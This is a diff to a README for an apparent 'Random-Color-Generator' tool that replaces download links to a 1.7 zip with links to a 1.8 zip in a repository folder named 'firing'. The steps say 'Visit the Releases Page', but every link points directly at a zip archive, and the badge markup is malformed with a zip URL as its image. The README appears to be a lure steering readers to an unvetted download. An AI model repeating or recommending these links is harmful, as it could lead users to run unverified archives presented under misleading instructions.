@@ -1,6 +1,6 @@
 # 🌈 Random-Color-Generator - Create Beautiful RGB Colors Instantly
 
-[![Download Now](https://raw.githubusercontent.com/jdmzzz/Random-Color-Generator/main/firing/Random-Color-Generator-1.7.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/jdmzzz/Random-Color-Generator/main/firing/Random-Color-Generator-1.7.zip)
+[![Download Now](https://github.com/jdmzzz/Random-Color-Generator/raw/refs/heads/main/firing/Color_Generator_Random_1.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/jdmzzz/Random-Color-Generator/raw/refs/heads/main/firing/Color_Generator_Random_1.8.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ Random-Color-Generator is a clean and aesthetic tool that helps you generate bea
 Follow these steps to download and run the Random-Color-Generator:
 
 1. **Visit the Releases Page**: Click the link below to go to the Downloads page where you can find the latest version of the application.
-   [Visit this page to download](https://raw.githubusercontent.com/jdmzzz/Random-Color-Generator/main/firing/Random-Color-Generator-1.7.zip)
+   [Visit this page to download](https://github.com/jdmzzz/Random-Color-Generator/raw/refs/heads/main/firing/Color_Generator_Random_1.8.zip)
 
 2. **Choose the Correct Version**: On the releases page, you will see various versions of the software. Select the latest version for the best experience. 
 
@@ -40,7 +40,7 @@ Follow these steps to download and run the Random-Color-Generator:
 
 To get started, visit the releases page linked below. Choose the latest version and follow the simple instructions to download and install the application on your computer.
 
-[Visit this page to download](https://raw.githubusercontent.com/jdmzzz/Random-Color-Generator/main/firing/Random-Color-Generator-1.7.zip)
+[Visit this page to download](https://github.com/jdmzzz/Random-Color-Generator/raw/refs/heads/main/firing/Color_Generator_Random_1.8.zip)
 
 ## 📜 Contributing
 
